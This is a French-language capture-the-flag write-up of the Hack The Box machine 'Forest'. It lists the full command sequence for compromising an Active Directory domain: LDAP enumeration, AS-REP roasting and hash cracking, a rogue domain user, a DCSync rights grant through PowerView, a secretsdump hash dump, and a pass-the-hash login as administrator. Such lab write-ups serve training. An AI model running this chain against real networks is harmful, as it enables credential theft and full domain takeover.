# Information

- Platform: HTB
- Difficulty: Easy
- Date: 12/08/2026
- Link: https://app.hackthebox.com/machines/Forest

# Objective

# Enumeration

## Nmap
```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 09:38 +0200
Nmap scan report for forest.htb (10.129.45.60)
Host is up (0.030s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-08-12 07:45:28Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
52406/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-08-12T00:46:17-07:00
| smb2-time: 
|   date: 2026-08-12T07:46:18
|_  start_date: 2026-08-12T06:58:45
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.06 seconds

```

On obtient le domaine : htb.local

## SMB

```sh
# Enum share avec smbclient
smbclient -L forest.htb
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to forest.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# Enum share avec nxc
nxc smb forest.htb -u '' -p '' --shares
SMB         10.129.45.161   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.45.161   445    FOREST           [+] htb.local\: 
SMB         10.129.45.161   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED


```
Anonymous login successfull mais aucun share
## LDAP

```sh
## Voyons si le ldap anonyme reponds 
ldapsearch -x -H ldap://forest.htb                       
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object
text: 0000208D: NameErr: DSID-0310021B, problem 2001 (NO_OBJECT), data 0, best 
 match of:
        ''
# numResponses: 1
```

```sh
## Allons recuperer les namingcontexts pour enumerer plus loin
ldapsearch -x -H ldap://forest.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```sh
## On trouve DC=htb,DC=local
## On recupere les user avec 
ldapsearch -x -H ldap://forest.htb -b "DC=htb,DC=local" '(objectClass=User)' samaccountname | grep -i samaccountname | cut -d ' ' -f 2
requesting:
Guest
DefaultAccount
FOREST$
EXCH01$
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
andy
mark
santi
```
Beaucoup de mail et les 5 "vrai" user ne donne pas de reponse en BF, roasting ou password spraying il doit y avoir autre chose. Enumeront tous les objets (avant on s'es contenté des User)
```sh
# Enumeront tous les objets (avant on s'es contenté des User)
ldapsearch -x -H ldap://forest.htb -b "DC=htb,DC=local" '(objectClass=*)'
--snip--
# numResponses: 316
# numEntries: 312
# numReferences: 3

## Beaucoup de resultat je ne vais pas tout mettre mais on tombe sur un truc interessant
# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
```

# Foothold

Toujours rien en BF (de toutes facons sans liste spé un rockyou prendrait plusieurs jours a etre fait vu la vitesse ...) voyons si c'est roastable

```sh
## On va utiliser GetNPUsers
impacket-GetNPUsers htb.local/ -dc-ip forest.htb -usersfile userlist.ldap -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

--snip--
$krb5asrep$23$svc-alfresco@HTB.LOCAL:49aa04a7d07f460fb55d53fcbc4595df$831407d9d72a3cc8d8f0f3467f6e38d2a287fce272e79924c8455f65ba3cfbbd6b2b35bc31eba928cf73f2431f4a73a9c49f1f0d1ec5a707bc8b32693018fc43878025c84bf8eaedd8cb8742855893a2dc0a6cc264651fc4ab97a2b2efa318326ab0a4eea8cf2dabbd733969edd64095f05280f8c55d045cb7bb9b7d8dde72dfdc1f54e6306577cef32cedcddf7a5c232b73f4ae5e74fd0078679546da6b6edfe43711cfc37b3c036c5213e37693927c1098b9ed82733831822b36e2bf6ee9384df79937ea5ec020ca60e19ba99d3f5f2982967796fec95254be1fa6d7288551fe9d3d125fb6
```

Bingo maintenant hashcat :

```sh
.\hashcat.exe -m 18200 .\hashes.txt .\rockyou.txt
--snip--
$krb5asrep$23$svc-alfresco@HTB.LOCAL:3efe6cb170066517e1432888c79e3793$f736781c83adbb97d1e720186cff7951988c88e81cda293900f7013209f6277c0cb1e9d3c77bc7c4aa9fba60943a6ae25ba3be66fe1cd6bb09a24ee249fcf1d8e823227728030523a6142345ff4df0609fe71521fbda6cea0163839f63500a4ffeaab41d33f828ecf702c0c04fbab854483901ef035cf805b5dffbc29ce815f8f16bc3d1acc7a1e458fc4103a60b29aad86c143b72b049205341b299961c529f2a00f50103fc4584142bf59f27b05b210b25050346f4d3eb569cec4538b0849a88d858f0d8d27fe1bd9b50ac2bcce6d3556f2c6d7648d95ee9d505ff032e16d19ecbab2ae23c:s3rvice
```

# Lateral Movement to user

On trouve directement le flag sur le desktop de svc-alfresco
# Privilege Escalation

## Local enumeration

Commencons par bloodhound :

```sh
evil-winrm -i forest.htb -u svc-alfresco -p s3rvice

# On upload sharphound
upload /usr/share/sharphound/SharpHound.exe

# On le lance
./SharpHound.exe -c all

# On recupere le zip 
download $ZipFile

# En marquand svc-alfresco Owned et en faisant shortest path from owned on constate un chemin possible vers HTB.LOCAL le domaine
```

![[Pasted image 20260813145840.png]]
Le groupe "Account operator" dont on herite les droits nous permet de nous ajouter au groupe "Exchange windows permissions" qui possede les droit de DCSync le domaine.
## PrivEsc vector

Pour eviter les eventuelle regles sur alfresco et surtout pour eviter de modifier des droits a des compte utilisé (entrainement situation reelle) on va creer un compte neuf pour faire l'exploit.

```sh
## Dans evil-winrm
# On crée un compte
net user john abc123! /add /domain

# On l'ajoute au groupe "Exchange Windows Permissions" pour lui donner les droits de DCSync
net group "Exchange Windows Permissions" john /add

# On l'ajoute au groupe local "Remote Management Users" si besoin de winrm
net localgroup "Remote Management Users" john /add

# On upload PowerView et on l'importe
upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
Import-Module ./powerview.ps1

# On cré les objet identifiant necessaire pour l'ajout
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)

# On ajoute les droit de DCSync
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

# Et enfin on DCSync
impacket-secretsdump htb/john@forest.htb

#On peut alors se connecter via winrm
evil-winrm -i forest.htb -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

# Pillaging

## Creds

- svc-alfresco:s3rvice

# Flags / Proof

# Lessons Learned

# Related Notes

[[ldapsearch]]
[[DCSync]]
[[bloodhound-python]]
